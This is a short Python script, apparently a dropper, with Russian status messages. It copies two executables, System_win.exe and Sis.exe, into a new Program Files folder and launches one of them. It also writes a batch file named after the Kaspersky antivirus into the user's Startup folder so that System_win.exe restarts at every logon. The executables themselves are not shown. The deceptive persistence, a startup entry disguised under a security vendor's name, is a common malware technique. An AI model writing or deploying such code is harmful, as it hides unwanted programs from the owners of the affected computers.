import os
import shutil

text_bat = 'taskkill /IM System_win.exe /f \n' \
           'cd /d C:\Program Files\SystemA \n' \
           'start System_win.exe \n'

inp = os.getcwd()
if os.path.exists('C:\Program Files\SystemA') == False:
    os.chdir('C:\Program Files')
    os.mkdir('SystemA')
    os.chdir(inp)
shutil.copy(f'System_win.exe', "C:\Program Files\SystemA")
shutil.copy(f'Sis.exe', "C:\Program Files\SystemA")
print('exe загружен')

file = open(rf'C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\kaspersky.bat', 'w', encoding='utf-8')
file.write(text_bat)
file.close()

os.startfile(rf'C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\kaspersky.bat')

print('bat загружен и запущен')


os.chdir('C:\Program Files\SystemA')
text_bat_stop = 'taskkill /IM System_win.exe /f \n'



file = open(rf'1.bat', 'w', encoding='utf-8')
file.write(text_bat_stop)
file.close()


print('Всё готово')
